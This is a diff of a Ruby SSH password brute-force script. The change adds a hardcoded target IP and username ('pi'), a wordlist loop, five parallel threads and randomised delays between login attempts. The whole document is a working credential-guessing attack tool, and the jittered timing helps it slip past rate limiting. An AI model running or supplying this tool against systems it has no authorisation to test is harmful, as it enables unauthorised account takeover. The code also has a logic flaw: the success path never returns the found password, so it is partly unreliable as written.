@@ -1,100 +1,102 @@
+# brute_force.rb
 require 'net/ssh'
-require 'optparse'
+require 'parallel'
+require 'socket'
+require 'timeout'
+require 'logger'
 
 # Configuration
-options = {}
-OptionParser.new do |opts|
-  opts.banner = "Usage: ssh_brute_force.rb [options]"
+host = '192.168.1.244' # Replace with your Raspberry Pi's IP
+port = 22
+username = 'pi' # Username to brute force
+password_list = 'passwords.txt' # File containing passwords for brute force
+log_dir = '.log' # Directory to store logs
+delay_between_attempts = 0.1 # Delay between attempts in seconds
 
-  opts.on("-t", "--target HOST", "Target host (IP or hostname)") do |t|
-    options[:host] = t
+# Logger setup
+Dir.mkdir(log_dir) unless Dir.exist?(log_dir)
+log_file = File.join(log_dir, 'brute_force.log')
+logger = Logger.new(log_file)
+
+# Global termination flag for graceful thread stopping
+$terminate = false
+
+# Function to check if SSH server is reachable
+def ssh_server_reachable?(host, port, logger)
+  begin
+    Timeout.timeout(5) do
+      TCPSocket.new(host, port).close
+    end
+    true
+  rescue Errno::ECONNREFUSED, Timeout::Error => e
+    logger.error("[!] SSH server is not reachable: #{e.message}")
+    false
   end
+end
 
-  opts.on("-u", "--user USERNAME", "Username to brute force") do |u|
-    options[:username] = u
-  end
-
-  opts.on("-w", "--wordlist FILE", "Path to the password wordlist") do |w|
-    options[:password_list] = w
-  end
-
-  opts.on("-l", "--log FILE", "Path to the log file") do |l|
-    options[:log_file] = l
-  end
-
-  opts.on("-p", "--port PORT", "Port (default 22)", Integer) do |p|
-    options[:port] = p
-  end
-end.parse!
-
-# Set default values
-host = options[:host] || '192.168.1.1'
-username = options[:username] || 'pi'
-password_list = options[:password_list] || 'passwords.txt'
-log_file = options[:log_file] || 'brute_force.log'
-port = options[:port] || 22
-
-# Function to attempt SSH connection
-def ssh_brute_force(host, port, username, password_list, log_file)
-  # Check if the password list file exists
+# Function to perform SSH brute force
+def ssh_brute_force(host, port, username, password_list, logger, delay_between_attempts)
   unless File.exist?(password_list)
-    log_message(log_file, "[!] Password list file not found: #{password_list}")
+    logger.error("[!] Password list file not found: #{password_list}")
+    puts "[!] Password list file not found: #{password_list}"
     return nil
   end
 
-  total_passwords = File.foreach(password_list).count
-  current_password = 0
+  unless ssh_server_reachable?(host, port, logger)
+    return nil
+  end
 
-  File.foreach(password_list) do |line|
-    current_password += 1
-    password = line.strip
-    next if password.empty? # Skip empty lines
+  passwords = File.readlines(password_list).map(&:strip).reject(&:empty?)
+  total_passwords = passwords.size
 
-    progress = (current_password.to_f / total_passwords * 100).round(2)
-    log_message(log_file, "[*] Progress: #{progress}% (#{current_password}/#{total_passwords})")
-    log_message(log_file, "[*] Trying: #{username}:#{password}")
+  Parallel.each_with_index(passwords, in_threads: 5) do |password, index|
+    break if $terminate
+
+    progress = ((index + 1).to_f / total_passwords * 100).round(2)
+    logger.info("[*] Progress: #{progress}% (#{index + 1}/#{total_passwords})")
+    logger.info("[*] Trying: #{username}:#{password}")
 
     begin
-      Net::SSH.start(host, username, password: password, port: port, timeout: 5) do |_ssh|
+      Net::SSH.start(host, username, password: password, port: port, timeout: 5, non_interactive: true) do |_ssh|
         success_message = "[+] Success! Password found: #{password}"
-        log_message(log_file, success_message)
-        return password
+        logger.info(success_message)
+        puts success_message
+        $terminate = true
+        break
       end
     rescue Net::SSH::AuthenticationFailed
-      log_message(log_file, "[-] Incorrect password: #{password}")
-    rescue Net::SSH::Exception, Net::SSH::ConnectionTimeout => e
-      log_message(log_file, "[!] Connection error: #{e.message}")
+      logger.info("[-] Incorrect password: #{password}")
+    rescue Net::SSH::ConnectionTimeout => e
+      logger.error("[!] Connection timeout: #{e.message}")
       return nil
     rescue StandardError => e
-      log_message(log_file, "[!] Unexpected error: #{e.message}")
+      logger.error("[!] Unexpected error: #{e.message}")
       return nil
+    ensure
+      delay = delay_between_attempts + rand(0.1..0.5) # Dynamic delay
+      sleep(delay) unless $terminate
     end
   end
 
-  log_message(log_file, "[-] Password not found.")
+  logger.info("[-] Password not found.") unless $terminate
   nil
 end
 
-# Helper function to log messages
-def log_message(log_file, message)
-  timestamp = Time.now.strftime("%Y-%m-%d %H:%M:%S")
-  formatted_message = "[#{timestamp}] #{message}"
-  begin
-    File.open(log_file, 'a') do |log|
-      log.puts(formatted_message)
-    end
-  rescue => e
-    puts "[!] Failed to write to log file: #{e.message}"
-  end
-  puts formatted_message
+# Main execution
+logger.info("=== SSH Brute Force ===")
+
+# Check if password list file exists
+unless File.exist?(password_list)
+  logger.error("[!] Password list file not found: #{password_list}")
+  puts "[!] Password list file not found: #{password_list}"
+  puts "[!] Please provide a valid password list file."
+  exit(1)
 end
 
-# Main execution
-puts "=== SSH Brute Force ==="
-found_password = ssh_brute_force(host, port, username, password_list, log_file)
+found_password = ssh_brute_force(host, port, username, password_list, logger, delay_between_attempts)
 
 if found_password
-  puts "[+] Found password: #{found_password}"
+  logger.info("[+] Found password: #{found_password}")
 else
-  puts "[-] Brute force completed unsuccessfully."
+  logger.info("[-] Brute force completed unsuccessfully.")
 end
